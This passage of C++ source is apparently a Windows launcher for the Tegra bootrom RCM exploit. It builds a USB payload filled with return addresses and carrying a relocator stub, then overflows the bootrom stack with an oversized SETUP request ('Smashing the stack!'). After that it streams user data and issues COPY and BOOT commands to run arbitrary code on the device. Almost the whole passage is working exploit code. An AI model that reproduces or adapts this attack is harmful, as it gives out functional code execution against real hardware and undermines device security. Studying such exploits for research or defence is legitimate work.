		RCMDeviceHacker rcmDev(Usb, handle); handle = nullptr;

		libusbk::version_t usbkVersion;
		memset(&usbkVersion, 0, sizeof(usbkVersion));
		const auto versRetVal = rcmDev.getDriverVersion(usbkVersion);
		if (versRetVal <= 0)
		{
			_ftprintf(stderr, TEXT("Failed to get libusbK driver version for device with win32 error %d\n"), -versRetVal);
			return -6;
		}
		else if (usbkVersion.major != 3 || usbkVersion.minor != 0 || usbkVersion.micro != 7)
		{
			_tprintf(TEXT("The opened device isn't using the correct libusbK driver version (expected: %u.%u.%u got: %u.%u.%u)\n"),
							3, 0, 7, usbkVersion.major, usbkVersion.minor, usbkVersion.micro);
			_tprintf(TEXT("Please run Zadig and install the libusbK (v3.0.7.0) driver for this device\n"));

			_ftprintf(stderr, TEXT("Failed to open USB device handle because of wrong driver version installed\n"));
			return -6;
		}

		u8 didBuf[0x10];
		memset(didBuf, 0, sizeof(didBuf));
		const auto didRetVal = rcmDev.readDeviceId(didBuf, sizeof(didBuf));
		if (didRetVal >= int(sizeof(didBuf)))
		{
			_tprintf(TEXT("RCM Device with id %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X initialized successfully!\n"),
				(u32)didBuf[0],(u32)didBuf[1],(u32)didBuf[2],(u32)didBuf[3],(u32)didBuf[4],(u32)didBuf[5],(u32)didBuf[6],(u32)didBuf[7],
				(u32)didBuf[8],(u32)didBuf[9],(u32)didBuf[10],(u32)didBuf[11],(u32)didBuf[12],(u32)didBuf[13],(u32)didBuf[14],(u32)didBuf[15]);
		}
		else
		{
			if (didRetVal < 0)
				_ftprintf(stderr, TEXT("Reading device id failed with win32 error %d\n"), -didRetVal);
			else
				_ftprintf(stderr, TEXT("Was only able to read %d out of %d bytes of device id\n"), didRetVal, (int)sizeof(didBuf));

			return -7;
		}

		size_t currPayloadOffs = 0;
		ByteVector payloadBuf;

		// Prefix the image with an RCM command, so it winds up loaded into memory at the right location (0x40010000).
		// Use the maximum length accepted by RCM, so we can transmit as much payload as we want; we'll take over before we get to the end.
		{
			const u32 lengthData = 0x30298;
			payloadBuf.resize(payloadBuf.size() + sizeof(lengthData));
			memcpy(&payloadBuf[currPayloadOffs], &lengthData, sizeof(lengthData));
			currPayloadOffs += sizeof(lengthData);
		}

		// pad out to 680 so the payload starts at the right address in IRAM
		payloadBuf.resize(680, 0);
		currPayloadOffs = payloadBuf.size();

		constexpr u32 RCM_PAYLOAD_ADDR = 0x40010000;
		if (usingNoMezzo)
		{
			constexpr size_t bytesToAdd = 0x1a3a * sizeof(u32);
			payloadBuf.resize(payloadBuf.size()+bytesToAdd, 0);
			currPayloadOffs += bytesToAdd;
			assert(currPayloadOffs == payloadBuf.size());

			// Reload the user-supplied binary in case it changed
			readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, 0, 0, false);
			if (readFileRes != 0)
				return readFileRes;

			u32 entry = RCM_PAYLOAD_ADDR + (u32)userFileBuf.size() + sizeof(u32);
			entry |= 1; //we want to jump to thumb code

			payloadBuf.resize(payloadBuf.size()+sizeof(u32));
			memcpy(&payloadBuf[currPayloadOffs], &entry, sizeof(entry));
			currPayloadOffs += sizeof(entry);
			assert(currPayloadOffs == payloadBuf.size());
		}
		else
		{
			constexpr u32 INTERMEZZO_LOCATION = 0x4001F000;
			// Populate from[RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
			// We'll use this data to smash the stack when we execute the vulnerable memcpy.
			{
				constexpr size_t bytesToAdd = (INTERMEZZO_LOCATION-RCM_PAYLOAD_ADDR);
				payloadBuf.resize(payloadBuf.size()+bytesToAdd);
				while (currPayloadOffs < payloadBuf.size())
				{
					const u32 spreadMeAround = INTERMEZZO_LOCATION;
					memcpy(&payloadBuf[currPayloadOffs], &spreadMeAround, sizeof(spreadMeAround));
					currPayloadOffs += sizeof(spreadMeAround);
				}
			}

			// Reload the user-supplied relocator in case it changed
			if (!usingBuiltinMezzo)
			{
				readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, 0, 0, false);
				if (readFileRes != 0)
					return readFileRes;
			}

			// Include the Intermezzo binary in the command stream. This is our first-stage payload, and it's responsible for relocating the final payload to 0x40010000.
			{
				payloadBuf.resize(payloadBuf.size()+mezzoBuf.size());
				if (currPayloadOffs < payloadBuf.size())
				{
					memcpy(&payloadBuf[currPayloadOffs], &mezzoBuf[0], mezzoBuf.size());
					currPayloadOffs += mezzoBuf.size();
				}
				assert(currPayloadOffs == payloadBuf.size());
			}

			constexpr u32 PAYLOAD_LOAD_BLOCK = 0x40020000;
			// Finally, pad until we've reached the position we need to put the payload.
			// This ensures the payload winds up at the location Intermezzo expects.
			{
				const auto position = INTERMEZZO_LOCATION + mezzoBuf.size();
				const auto paddingSize = PAYLOAD_LOAD_BLOCK - position;

				payloadBuf.resize(payloadBuf.size()+paddingSize, 0);
				currPayloadOffs += paddingSize;
				assert(currPayloadOffs == payloadBuf.size());
			}

			// Reload the user-supplied binary in case it changed
			readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, 0, 0, false);
			if (readFileRes != 0)
				return readFileRes;
		}

		// Put our user-supplied binary into the payload
		{
			payloadBuf.resize(payloadBuf.size()+userFileBuf.size());
			if (currPayloadOffs < payloadBuf.size())
			{
				memcpy(&payloadBuf[currPayloadOffs], &userFileBuf[0], userFileBuf.size());
				currPayloadOffs += userFileBuf.size();
			}
			assert(currPayloadOffs == payloadBuf.size());
		}

		constexpr size_t PAYLOAD_TOTAL_MAX_SIZE = 192*1024;
		// Pad the payload to fill a USB request exactly, so we don't send a short
		// packet and break out of the RCM loop.
		if (payloadBuf.size() < PAYLOAD_TOTAL_MAX_SIZE)
			payloadBuf.resize(align_up(payloadBuf.size(), RCMDeviceHacker::PACKET_SIZE), 0);
		else
			payloadBuf.resize(PAYLOAD_TOTAL_MAX_SIZE);

		// Send the constructed payload, which contains the command, the stack smashing values, the Intermezzo relocation stub, and the user payload.
		_tprintf(TEXT("Uploading payload (mezzo size: %u, user size: %u, total size: %u, total padded size: %u)...\n"),
						(u32)mezzoBuf.size(), (u32)userFileBuf.size(), (u32)currPayloadOffs, (u32)payloadBuf.size());

		const auto writeRes = rcmDev.write(&payloadBuf[0], payloadBuf.size());
		if (writeRes < (int)payloadBuf.size())
		{
			if (writeRes < 0)
				_ftprintf(stderr, TEXT("Win32 error %d happened trying to write payload buffer to RCM\n"), -writeRes);
			else
				_ftprintf(stderr, TEXT("Was only able to upload %d out of %d bytes of payload buffer\n"), writeRes, (int)payloadBuf.size());

			return -8;
		}

		// The RCM backend alternates between two different DMA buffers.Ensure we're about to DMA into the higher one, so we have less to copy during our attack.
		const auto switchRes = rcmDev.switchToHighBuffer();
		if (switchRes != 0)
		{
			if (switchRes < 0)
			{
				_ftprintf(stderr, TEXT("Failed to switch to high buffer, win32 error %d\n"), -switchRes);
				return -9;
			}
			else if (switchRes != RCMDeviceHacker::PACKET_SIZE)
			{
				_ftprintf(stderr, TEXT("Only wrote %d out of %d bytes during high buffer switch\n"), switchRes, (int)RCMDeviceHacker::PACKET_SIZE);
				return -9;
			}

			_tprintf(TEXT("Switched to high buffer\n"));
		}

		_tprintf(TEXT("Smashing the stack!\n"));
		const auto smashRes = rcmDev.smashTheStack();
		if (smashRes < 0)
		{
			_ftprintf(stderr, TEXT("Got win32 error %d tryin to smash\n"), -smashRes);
			return -10;
		}

		_tprintf(TEXT("Smashed the stack with a 0x%04x byte SETUP request!\n"), smashRes);

		if (readbackUsb || loadData.size() > 0 || copyData.size() > 0 || bootData.size() > 0)
		{
			ByteVector readBuffer(32768, 0);
			int bytesRead = 0;
			while ((bytesRead = rcmDev.read(&readBuffer[0], readBuffer.size())) > 0)
			{
				auto dataIt = std::find_if(loadData.begin(), loadData.end(), [bytesRead,&readBuffer](const LoadDataItem& itm)
				{
					if (itm.name.length() == 0)
						return false;

					const char* dataName = itm.name.c_str();
					const size_t dataNameLen = itm.name.length();
					if (bytesRead > int(dataNameLen) && readBuffer[dataNameLen] == '\n' &&
						strncmp((const char*)&readBuffer[0], dataName, dataNameLen) == 0)
						return true;

					return false;
				});

				static const char READY_INDICATOR[] = "READY.\n";
				if (bytesRead == array_countof(READY_INDICATOR)-1 && memcmp(&readBuffer[0], READY_INDICATOR, array_countof(READY_INDICATOR)-1) == 0)
				{
					_tprintf(TEXT("Switching to command mode due to %hs"), READY_INDICATOR);
					for (auto& currData : loadData)
					{
						if (!currData.reloaded)
						{
							readFileRes = ReadFileToBuf(currData.dataBytes, TEXT("data"), currData.filename.c_str(), currData.offset, currData.maxCount, false);
							if (readFileRes != 0)
								return readFileRes;

							if (currData.dataBytes.size() < currData.maxCount)
								currData.dataBytes.resize(currData.maxCount, 0);

							currData.reloaded = true;
						}

						_tprintf(TEXT("Sending %Ts (%llu bytes) to address 0x%08llx\n"), currData.filename.c_str(), (u64)currData.dataBytes.size(), (u64)currData.address);
						if (currData.dataBytes.size() == 0)
							continue;

						int bytesSent = rcmDev.write((const u8*)"RECV", strlen("RECV"));
						if (bytesSent == strlen("RECV"))
						{
							u32 offsetData[] ={ _byteswap_ulong((u32)currData.address), _byteswap_ulong((u32)currData.dataBytes.size()) };
							bytesSent = rcmDev.write((const u8*)&offsetData[0], sizeof(offsetData));
							if (bytesSent == sizeof(offsetData))
								bytesSent = rcmDev.write(&currData.dataBytes[0], currData.dataBytes.size(), readBuffer.size());
						}
						if (bytesSent != int(currData.dataBytes.size()))
						{
							if (bytesSent < 0)
							{
								_ftprintf(stderr, TEXT("Got win32 err %d during send operation!\n"), -bytesSent);
								return -10;
							}
							else if (size_t(bytesSent) < currData.dataBytes.size())
							{
								_ftprintf(stderr, TEXT("Only sent %d out of %llu bytes for data file %Ts!\n"), bytesSent, (u64)currData.dataBytes.size(), currData.filename.c_str());
								continue;
							}
						}
					}

					for (const auto& currData : copyData)
					{
						_tprintf(TEXT("Sending COPY command %hs (from 0x%08llx-0x%08llx to 0x%08llx-0x%08llx) type %u\n"),
							currData.name.c_str(), (u64)currData.srcaddr, (u64)currData.srcaddr+currData.srclen,
							(u64)currData.dstaddr, (u64)currData.dstaddr+(u64)currData.dstlen, currData.copyType);


						int bytesToSend = (int)strlen("COPY");
						int bytesSent = rcmDev.write((const u8*)"COPY", (size_t)bytesToSend);
						if (bytesSent == bytesToSend)
						{
							u32 copyData[] ={ _byteswap_ulong((u32)currData.copyType),
								_byteswap_ulong((u32)currData.srcaddr), _byteswap_ulong((u32)currData.srclen),
								_byteswap_ulong((u32)currData.dstaddr), _byteswap_ulong((u32)currData.dstlen) };

							bytesToSend = sizeof(copyData);
							bytesSent = rcmDev.write((const u8*)&copyData[0], (size_t)bytesToSend);
						}
						if (bytesSent != bytesToSend)
						{
							if (bytesSent < 0)
							{
								_ftprintf(stderr, TEXT("Got win32 err %d during send operation!\n"), -bytesSent);
								return -10;
							}
							else if (bytesSent < bytesToSend)
							{
								_ftprintf(stderr, TEXT("Only sent %d out of %d bytes for copy command %hs!\n"), bytesSent, bytesToSend, currData.name.c_str());
								continue;
							}
						}
					}

					for (const auto& currData : bootData)
					{
						_tprintf(TEXT("Booting AArch64 with PC 0x%08llx...\n"), (u64)currData.pc);
						int bytesSent = rcmDev.write((const u8*)"BOOT", strlen("BOOT"));
						if (bytesSent == strlen("BOOT"))
						{
							u32 addrData = _byteswap_ulong((u32)currData.pc);
							bytesSent = rcmDev.write((const u8*)&addrData, sizeof(addrData));
							if (bytesSent == sizeof(addrData))
							{
								_tprintf(TEXT("BOOT command sent successfully! Exiting.\n"));
								return 0;
							}
						}
					}
				}
				else if (dataIt == loadData.end()) //no matching section to send, just print out the message
				{
					WinString printMe((const char*)&readBuffer[0], (const char*)&readBuffer[bytesRead]);
					_tprintf(printMe.c_str());
				}
				else //got a section to send
				{
					_tprintf(TEXT("Switching to sending of section '%hs'\n"), dataIt->name.c_str());
					if (!dataIt->reloaded)
					{
						readFileRes = ReadFileToBuf(dataIt->dataBytes, TEXT("data"), dataIt->filename.c_str(), dataIt->offset, dataIt->maxCount, false);
						if (readFileRes != 0)
							return readFileRes;

						dataIt->reloaded = true;
					}

					size_t numBytesSent = 0;
					while ((bytesRead = rcmDev.read(&readBuffer[0], readBuffer.size())) >= 8)
					{
						u32 offset, length;
						memcpy(&offset, &readBuffer[0], sizeof(offset));
						memcpy(&length, &readBuffer[sizeof(offset)], sizeof(length));
						offset = _byteswap_ulong(offset);
						length = _byteswap_ulong(length);

						if (length == 0)
						{
							_tprintf(TEXT("Finished sending section '%hs' (total bytes sent: %llu)\n"), dataIt->name.c_str(), (u64)numBytesSent);
							break;
						}

						const auto neededBytes = size_t(offset)+size_t(length);
						if (neededBytes > dataIt->dataBytes.size())
						{
							_ftprintf(stderr, TEXT("Device requested %llu bytes (we only have %llu in file '%Ts')!\n"), (u64)neededBytes, (u64)dataIt->dataBytes.size(), dataIt->filename.c_str());
							return -2;
						}

						_tprintf(TEXT("Sending 0x%08x bytes from offset 0x%08x\n"), length, offset);
						int bytesSent = rcmDev.write(&dataIt->dataBytes[offset], length, readBuffer.size());
						if (bytesSent != int(length))
						{
							if (bytesSent >= 0)
								_ftprintf(stderr, TEXT("Warn: Sent only %d out of requested %u bytes\n"), bytesSent, length);
							else
							{
								_ftprintf(stderr, TEXT("Got win32 err %d during send operation!\n"), -bytesSent);
								return -10;
							}
						}
						numBytesSent += bytesSent;
					}
					if (bytesRead < 0)
					{
						_ftprintf(stderr, TEXT("Got win32 err %d during [offset,length] read operation!\n"), -bytesRead);
						return -10;
					}
					else if (bytesRead < 8)
					{
						_ftprintf(stderr, TEXT("Read too short packet (%d bytes) while in section send mode, dropping out.\n"), bytesRead);
						break;
					}
				}
			}
			if (bytesRead < 0)
			{
				_ftprintf(stderr, TEXT("Win32 error %d during post-smash read op\n"), -bytesRead);
				return -10;
			}
		}
	}

	return 0;
}
